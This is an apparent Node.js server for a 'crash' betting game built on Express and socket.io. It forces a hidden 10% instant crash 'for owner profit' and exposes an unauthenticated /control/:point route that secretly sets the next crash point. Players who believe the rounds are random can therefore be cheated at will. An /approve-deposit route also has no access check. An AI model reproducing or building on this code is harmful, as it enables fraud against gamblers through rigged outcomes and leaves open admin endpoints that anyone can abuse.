const express = require('express');
const app = express();
const http = require('http').Server(app);
const io = require('socket.io')(http);

app.use(express.static('public'));

let multiplier = 1.00;
let nextCrashPoint = null;

function startRound() {
    multiplier = 1.00;
    // 10% chance to crash at 1.00x for owner profit
    let houseEdge = Math.random() < 0.10; 
    let crashPoint = nextCrashPoint || (houseEdge ? 1.00 : (1 + Math.pow(Math.random(), 2) * 15).toFixed(2));
    nextCrashPoint = null;

    let interval = setInterval(() => {
        if (multiplier >= parseFloat(crashPoint)) {
            io.emit('crash', multiplier.toFixed(2));
            clearInterval(interval);
            setTimeout(startRound, 5000); // 5 sec gap
        } else {
            multiplier += 0.01 * (multiplier < 2 ? 1 : multiplier * 0.5);
            io.emit('tick', multiplier.toFixed(2));
        }
    }, 100);
}

// Admin Commands
app.get('/control/:point', (req, res) => {
    nextCrashPoint = parseFloat(req.params.point);
    res.send("Target Set: " + nextCrashPoint);
});

app.get('/approve-deposit/:amount', (req, res) => {
    let amt = parseFloat(req.params.amount);
    let bonus = amt * 0.10; // 10% bonus logic
    io.emit('depositApproved', { amount: amt, bonus: bonus });
    res.send("Approved " + amt);
});

const PORT = process.env.PORT || 3000;
http.listen(PORT, () => { startRound(); });
        
